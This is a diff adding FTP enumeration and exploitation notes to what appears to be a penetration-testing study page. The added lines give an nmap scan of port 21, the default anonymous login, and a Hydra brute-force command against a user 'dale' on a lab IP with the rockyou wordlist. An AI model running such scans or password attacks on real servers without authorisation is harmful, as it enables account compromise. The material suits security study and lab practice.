@@ -13,3 +13,24 @@ A typical FTP session operates using two channels:
 
 FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session. While the session is open, the client may execute FTP commands on the server.
 
+### Enumerating FTP
+
+```
+nmap -sV [ip] -p 21
+```
+
+### Exploiting FTP
+
+#### FTP anonymous Login
+
+username: anonymous\
+password: \<blank>&#x20;
+
+#### Password cracking with Hydra
+
+Let's say we have a user Dale, whose password we wanna find on a particular ftp server. We use the sample command as shown below:
+
+```awk
+hydra -t 4 -l "dale" -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
+```
+
